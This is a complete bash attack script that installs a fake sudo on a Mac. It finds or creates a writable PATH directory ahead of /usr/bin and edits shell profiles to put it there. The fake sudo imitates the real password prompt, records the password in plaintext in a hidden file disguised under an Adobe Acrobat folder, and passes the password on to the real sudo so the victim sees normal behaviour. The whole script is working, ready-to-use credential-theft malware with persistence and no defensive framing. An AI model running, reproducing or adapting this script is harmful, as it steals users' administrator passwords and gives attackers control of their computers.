#!/bin/bash
# Sudo PATH Hijack — Zero UI credential capture
# Places a fake sudo in a PATH directory that comes before /usr/bin
# Captures password transparently when user runs sudo in Terminal
#
# MITRE: T1574.007 (Path Interception by PATH Environment Variable)
# Requires: Homebrew installed (common on dev Macs) or writable PATH dir

USER=$(whoami)
OUTFILE="$HOME/Library/Application Support/Adobe/AcrobatDC/.auth_cache"

# ============================================================
# Find Writable PATH Directory Before /usr/bin
# ============================================================

find_hijack_path() {
    IFS=':' read -ra PATH_DIRS <<< "$PATH"
    for dir in "${PATH_DIRS[@]}"; do
        # Stop if we hit /usr/bin — anything after is useless
        [ "$dir" = "/usr/bin" ] && return 1
        [ "$dir" = "/usr/sbin" ] && return 1
        
        # Check if writable and exists
        if [ -d "$dir" ] && [ -w "$dir" ]; then
            echo "$dir"
            return 0
        fi
    done
    return 1
}

HIJACK_DIR=$(find_hijack_path)

if [ -z "$HIJACK_DIR" ]; then
    echo "[-] No writable PATH directory before /usr/bin"
    echo "[*] Common targets: /opt/homebrew/bin, /usr/local/bin, ~/bin"
    
    # Try creating ~/bin and adding to PATH via shell profile
    mkdir -p "$HOME/bin"
    HIJACK_DIR="$HOME/bin"
    
    # Inject into shell profile if ~/bin isn't in PATH
    if ! echo "$PATH" | grep -q "$HOME/bin"; then
        for profile in "$HOME/.zshrc" "$HOME/.bash_profile" "$HOME/.bashrc"; do
            if [ -f "$profile" ]; then
                echo 'export PATH="$HOME/bin:$PATH"' >> "$profile"
                echo "[*] Added ~/bin to PATH in $profile"
                break
            fi
        done
    fi
fi

echo "[*] Hijack directory: $HIJACK_DIR"

# ============================================================
# Create Fake Sudo
# ============================================================

FAKE_SUDO="$HIJACK_DIR/sudo"
REAL_SUDO="/usr/bin/sudo"

cat > "$FAKE_SUDO" << 'FAKESUDO'
#!/bin/bash
# Transparent sudo wrapper — captures password, passes through to real sudo
OUTFILE="$HOME/Library/Application Support/Adobe/AcrobatDC/.auth_cache"
REAL_SUDO="/usr/bin/sudo"

# Check if -S flag (read from stdin) — don't interfere with scripted sudo
for arg in "$@"; do
    [ "$arg" = "-S" ] && exec "$REAL_SUDO" "$@"
done

# Check if sudo credentials are cached (no password needed)
if "$REAL_SUDO" -n true 2>/dev/null; then
    exec "$REAL_SUDO" "$@"
fi

# Prompt for password (mimics real sudo exactly)
/bin/echo -n "[sudo] password for $(whoami): " >&2
read -s PW
echo >&2

if [ -n "$PW" ]; then
    # Store captured password
    mkdir -p "$(dirname "$OUTFILE")"
    echo "$(date -u +%Y-%m-%dT%H:%M:%SZ)|$(whoami)|$PW|sudo_hijack" >> "$OUTFILE"
    chmod 600 "$OUTFILE"
fi

# Pass through to real sudo
echo "$PW" | "$REAL_SUDO" -S "$@"
EXIT_CODE=$?

# Self-destruct after first successful capture (optional — remove for persistent capture)
# rm -f "$0"

exit $EXIT_CODE
FAKESUDO

chmod +x "$FAKE_SUDO"

echo "[+] Fake sudo installed: $FAKE_SUDO"
echo "[*] Next time user runs 'sudo' in terminal, password is captured"
echo "[*] Completely transparent — user sees normal sudo behavior"
